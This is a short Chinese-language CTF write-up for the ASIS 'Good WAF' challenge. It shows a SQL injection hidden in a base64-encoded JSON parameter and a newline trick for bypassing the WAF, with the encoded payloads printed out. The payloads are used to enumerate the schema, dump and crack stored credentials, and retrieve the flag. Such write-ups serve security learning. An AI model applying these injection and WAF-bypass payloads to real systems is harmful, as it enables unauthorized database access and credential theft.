# Good WAF

賽中沒解出來

賽後紀錄一下

## 非正規解法

`.index.php.swp`可以直接看到FLAG

## 正規解法

參數可以餵`object=base64_encode({"data":"1"})`

很直覺就會想在"1"這邊SQL Injection

但賽中一直繞不掉WAF

後來才知道換行就可以繞掉了

例如： 

```
{
"data":"-1'union select 1,2-- '"}
```

所以`object=ewoiZGF0YSI6Ii0xJyB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhLS0gLSJ9`

就能得到`information_schema`, `waf_portal` 

再來撈表名： `ewoiZGF0YSI6Ii0xJyB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gIn0=`

=> `access_logs`,`credentials`,`news`

=> `access_logs`: `id`, `log`

=> `credentials`: `id`,`username`,`password`,`role`

撈帳密： `object=ewoiZGF0YSI6Ii0xJyB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoY29uY2F0KHVzZXJuYW1lLDB4MmYscGFzc3dvcmQpKSBmcm9tIGNyZWRlbnRpYWxzLS0gIn0=`

=> `valid_user`/`5f4dcc3b5aa765d61d8327deb882cf99`

=> `5f4dcc3b5aa765d61d8327deb882cf99` => `password`

找login point：`object=ewoiZGF0YSI6ICItMSd1bmlvbiBzZWxlY3QgMSxsb2cgZnJvbSBhY2Nlc3NfbG9ncy0tICIgfQ==`

=> 可以發現`GET /?action=log-in`

http://167.99.12.110/?action=log-in&credentials[]=valid_user&credentials[]=password

=> `ASIS{e279aaf1780c798e55477a7afc7b2b18}`

